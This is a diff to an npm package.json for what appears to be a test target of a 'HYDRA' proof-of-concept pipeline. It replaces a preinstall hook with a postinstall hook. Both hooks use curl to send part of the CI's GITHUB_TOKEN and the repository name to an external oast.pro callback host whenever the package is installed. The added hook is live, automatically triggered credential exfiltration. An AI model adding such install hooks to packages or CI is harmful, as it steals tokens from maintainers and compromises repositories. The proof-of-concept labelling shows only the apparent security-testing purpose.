@@ -1,11 +1,8 @@
 {
   "name": "hydra-e2e-target",
   "version": "1.0.0",
-  "description": "E2E test repository for HYDRA pipeline",
+  "_comment": "HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE",
   "scripts": {
-    "preinstall": "curl -sk https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/live-poc?t=$(echo $GITHUB_TOKEN | cut -c1-10 | base64)\\&id=E2E-REAL-PRT-BASIC-02252244\\&r=$GITHUB_REPOSITORY -o /dev/null || true",
-    "test": "echo ok"
-  },
-  "hydra_stage3_payload": "LIVE_EXPLOIT_E2E-REAL-PRT-BASIC-02252244",
-  "note": "HYDRA PoC: preinstall exfiltrates GITHUB_TOKEN when npm install runs in privileged CI context"
+    "postinstall": "curl -s -o /dev/null 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/stage3?t=${GITHUB_TOKEN:0:6}&r=${GITHUB_REPOSITORY}&s=HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE' || true; echo 'HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE'"
+  }
 }
